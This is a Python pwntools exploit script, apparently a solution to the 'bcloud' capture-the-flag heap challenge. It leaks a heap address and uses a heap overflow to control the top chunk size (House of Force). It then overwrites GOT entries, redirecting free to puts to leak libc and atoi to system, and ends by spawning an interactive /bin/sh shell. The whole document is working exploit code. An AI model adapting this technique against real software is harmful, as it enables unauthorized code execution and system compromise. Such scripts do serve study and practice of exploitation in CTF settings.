#!/usr/bin/python3

from pwn import *
elf = context.binary = ELF('./bcloud')
libc = elf.libc
context.log_level = 'debug'
gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()
def new(length, context):
    io.sendlineafter("option--->>\n", b'1')
    io.sendlineafter("note content:\n", str(length))
    io.sendlineafter("content:\n", context)
def edit(idx, context):
    io.sendlineafter("option--->>\n", b'3')
    io.sendline(str(idx))
    io.sendlineafter("content:\n", context)
def dele(idx):
    io.sendlineafter("option--->>\n", b'4')
    io.sendlineafter("id:\n", str(idx))
def dbg():
    gdb.attach(io)
    pause()
# leak the heap addr
# dbg()
io.sendafter("name:\n", b'A'*0x40)
heap = u32(io.recvuntil(b"! Welcome to BCTF", drop=True)[-4:])
log.info(f"heap_addr -> {hex(heap)}")

# overflow
io.sendafter("Org:\n", "A" * 0x40)
io.sendlineafter("Host:\n", p32(0xffffffff))
# dbg()

new((0x804b0a0 - 0x10) - (heap + 0xd0), b'AAAA')
# new((0xffffffff - (heap + 0xd0) + (0x804b0a0 - 0x10)), b'aaaa')
# dbg()
# new(0x40, b"a"*0x40)
payload = b'A'*0x80
payload += p32(elf.got.free) # note[0]
payload += p32(elf.got.atoi) * 2 # note[1] note[2]
new(0x8c, payload)
# dbg()


# free@got.plt -> puts@plt
edit(0, p32(elf.plt.puts))
dele(1)
atoi_addr = u32(io.recvn(4))
io.recv()
libc.address = atoi_addr - libc.sym.atoi
log.info(f"libc addr -> {hex(libc.address)}")

system_addr = libc.sym.system
log.info(f"system addr -> {hex(libc.sym.system)}")
# dbg()
io.sendline('\n')
edit(2, p32(system_addr))

io.sendlineafter(b'option--->>\n', b'/bin/sh\x00')

io.interactive()
